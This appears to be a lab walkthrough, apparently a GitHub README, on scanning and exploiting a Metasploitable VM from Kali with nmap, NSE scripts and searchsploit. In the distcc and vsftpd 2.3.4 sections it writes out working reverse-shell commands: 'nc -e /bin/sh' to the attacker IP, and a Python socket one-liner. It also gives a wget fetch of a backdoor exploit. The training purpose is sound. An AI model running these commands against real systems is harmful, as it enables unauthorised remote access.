# ESCANEO


Run zenmap
```
zenmap
```

Scan the  metasploitable machine

![12](https://user-images.githubusercontent.com/50930193/118370180-29f5c480-b56c-11eb-922e-717c55039305.jpg)

We get the results

![11](https://user-images.githubusercontent.com/50930193/118370095-b784e480-b56b-11eb-9b44-f513650b3d2d.jpg)

To know the types of scanning profiles
```
mousepad /usr/share/zenmap/config/scan_profile.usp  
```
###  NMAP

Also, to know the details of nmap commands go to this link:




###  LEARNING NMAP USING METASPLOITABLE MACHINE

I assume you have already installed the Metasploitable virtual machine and if it is running it is time to exploi it. 

First, we need to know what is the IP SOURCE and the IP TARGET.

To know our IP (IP SOURCE) or attacker's machine run just ifconfig

```
$ ifconfig                                                                                127 ⨯

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.153.167  netmask 255.255.255.0  broadcast 192.168.153.255
        inet6 fe80::20c:29ff:feff:69d  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:ff:06:9d  txqueuelen 1000  (Ethernet)
        RX packets 1143837  bytes 685320706 (653.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 643567  bytes 102346180 (97.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 60238  bytes 88599636 (84.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 60238  bytes 88599636 (84.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

To know our IP (IP TARGET). You can also use netdiscover to scan a range of IP addresses for the target host. Use any of the following command :

```
netdiscover -i eth0  
netdiscover -r 192.168.153.0/24
nmap -sn 192.168.153.1/24 | grep "Nmap scan report for"
```
We get the results
```
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.153.1   00:50:56:c0:00:08     92    5520  VMware, Inc.                                  
 192.168.153.2   00:50:56:f8:de:60      1      60  VMware, Inc.                                  
 192.168.153.169 00:0c:29:e0:b2:73      2     120  VMware, Inc.                                  
 192.168.153.254 00:50:56:fc:98:52      4     240  VMware, Inc.
```

In this case we have the following machines:

```
SOURCE:  192.168.153.167  ---> KALI
TARGET:  192.168.153.169  ---> METASPLOITABLE
```

To know what is the operating system of the target
```
nmap -O 192.168.153.169
```
![13](https://user-images.githubusercontent.com/50930193/118375422-376c7800-b587-11eb-9fb3-9ff76f3b6a57.jpg)

To know what are the ports, services and its version

```
nmap -sV  192.168.153.169  
```

![14](https://user-images.githubusercontent.com/50930193/118376028-1efe5c80-b58b-11eb-874e-5c3964ef8918.jpg)

By default, Nmap scans the top 1,000 ports for each scan protocol requested. This catches roughly 93% of the TCP ports and 49% of the UDP ports. With the -F (fast) option, only the top 100 ports are scanned, providing 78% TCP effectiveness and 39% for UDP. To specify a different number of ports. To scan all 65535 ports

```
nmap -sV  192.168.153.169 -p- 
```

![15](https://user-images.githubusercontent.com/50930193/118379272-ac977780-b59e-11eb-9d70-5c00d93036f3.jpg)

Scan just some ports
```
nmap -sV  -p21,80 192.168.153.169 
```
![16](https://user-images.githubusercontent.com/50930193/118379865-73add180-b5a3-11eb-96df-859a7580364a.jpg)

An intense, comprehensive scan. The -A option enables OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute (--traceroute). Without root privileges only version detection and script scanning are run. This is considered an intrusive scan.
```
nmap -T4 -A -v -p-
```
![17](https://user-images.githubusercontent.com/50930193/118379897-bb345d80-b5a3-11eb-8b50-6a9ba7efa746.jpg)

Please try logon to ftp using anonymous connection (USER:anonymoust PASS:guest)

![18](https://user-images.githubusercontent.com/50930193/118380059-cf2c8f00-b5a4-11eb-9c00-b9b512096ec0.jpg)

We have entered but we cannot do anything

Also with nmap we sen the results to one file XML or TXT

```
nmap -sV -p21,80 192.168.153.169 -oA results.txt
ls results.txt.*
```
We get the following three files
```
-rw-r--r-- 1 root root  354 May 15 18:48 results.txt.gnmap
-rw-r--r-- 1 root root  545 May 15 18:48 results.txt.nmap
-rw-r--r-- 1 root root 1838 May 15 18:48 results.txt.xml
```
With the XML file we can use searchsploit to find related exploits by each service
```
searchsploit -x --nmap results.txt.xml
```
![19](https://user-images.githubusercontent.com/50930193/118380320-73630580-b5a6-11eb-9dff-8d79cec8f684.jpg)

###  NSE COMMANDS 

The Nmap Scripting Engine (NSE) is one of Nmap's most powerful and flexible features. It allows users to write (and share) simple scripts (using the Lua programming language ) to automate a wide variety of networking tasks. Those scripts are executed in parallel with the speed and efficiency you expect from Nmap. Users can rely on the growing and diverse set of scripts distributed with Nmap, or write their own to meet custom needs.

Other way tos search vulnerable services is running nsevuln script. In order to find vulnerable services we can use the following command
```
nmap -sV -p53,6000,111,139,25,23,21,22,445,514,513,512,80,1524,1099,2121,3306,3632,5432,5900,2049,6200,6667,6697,8009,8180,8787,42605,47411,51474,52702 --script vuln 192.168.153.169
```

We have a detail of each service, we will analyze one of then: distcc

![20](https://user-images.githubusercontent.com/50930193/118382002-3272ed00-b5b6-11eb-88ef-facdf3903222.jpg)

We already know this service is vulnerable to CVE 2004–2687. So we need use the nse script to analyze and exploit this vulnerability

To find the locatiof of nse script use the following commands
```
locate *.nse
```

Go to the location of scripts and find one script to vsftpd
```
ls *distcc* -la
-rw-r--r-- 1 root root 3519 Oct 12  2020 distcc-cve2004-2687.nse
```
Open the distcc-cve2004-2687.nse file and review the command usage
```
mousepad distcc-cve2004-2687.nse
```
![21](https://user-images.githubusercontent.com/50930193/118382041-af9e6200-b5b6-11eb-95cd-2b12bf4dc186.jpg)

We also know there is a nmap script that can be used to exploit this vulnerability. So we try use the scripts with other command different to id, we use ifconfig

```
nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='ifconfig'" 192.168.153.169
```

![22](https://user-images.githubusercontent.com/50930193/118382071-17ed4380-b5b7-11eb-904d-96ad94817b66.jpg)

It works!!!, so we need the same method to get a reverse shell with the target

We need use three windows.

In the first window we need create a listener with netcat

```
nc nlvp 4444
```

In the second window we need search the right command in gtobin

```
python3 gtfo.py nc | more
```
![24](https://user-images.githubusercontent.com/50930193/118382346-f9d51280-b5b9-11eb-87ee-e4f42c9db317.jpg)

In the third window we can execute the nmap command 
```
nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh 192.168.153.167 4444'" 192.168.153.169
```
We get a reverse shell!!

![23](https://user-images.githubusercontent.com/50930193/118382266-20df1480-b5b9-11eb-80c4-570cc64a0d34.jpg)

Also we can a iteractive shell using this command

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![25](https://user-images.githubusercontent.com/50930193/118382533-36097280-b5bc-11eb-9db2-0aeeb9153287.jpg)

###  EXPLOITING vsFTPd version 2.3.4 

In several repositories such as github, db exploit, pastebin we can find exploits to vsftpd 2.3.4

a) [https://www.exploit-db.com/exploits/49757](https://www.exploit-db.com/exploits/49757)

b) [https://github.com/nomi-sec/PoC-in-GitHub/blob/master/2011/CVE-2011-2523.json](https://github.com/nomi-sec/PoC-in-GitHub/blob/master/2011/CVE-2011-2523.json)_

for a demo we will download this exploit
```
wget https://gist.githubusercontent.com/thaisingle/e2af5a83f06dc91fdf60faa23f43ffec/raw/ba8505125ccd2f9ae30c56903f2e817aa96b1854/vsFtpdBackdoor.py
```
Open the exploit and review how to use the command
```
mousepad vsFtpdBackdoor.py
```
![26](https://user-images.githubusercontent.com/50930193/118383451-5852be80-b5c3-11eb-8977-6efd4854e0b5.jpg)

Give execution rights to exploit and execute the exploit
```
chmod +x vsFtpdBackdoor.py
./vsFtpdBackdoor.py 192.168.153.169 21 
```
We get a shell but is not interactive

![27](https://user-images.githubusercontent.com/50930193/118383614-20e51180-b5c5-11eb-9f6c-996e24769d91.jpg)

To get a iterative shell we have to ways:

1) Directly with python command of gtfobin
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

2) Getting a reverse shell, you can use the following commands
```
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("192.168.153.167",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import pty;pty.spawn("/bin/bash")'
```
![29](https://user-images.githubusercontent.com/50930193/118383886-994cd200-b5c7-11eb-80a2-d801217737af.jpg)

###  ADDITIONAL RESOURCES

Install scripts to gtfobins
_src: [https://gtfobins.github.io/](https://gtfobins.github.io/)_
```
git clone https://github.com/t0thkr1s/gtfo
cd gtfo
python3 setup.py install
```
To run the command you have to add the binary
```
python3 gtfo.py [binary]
```
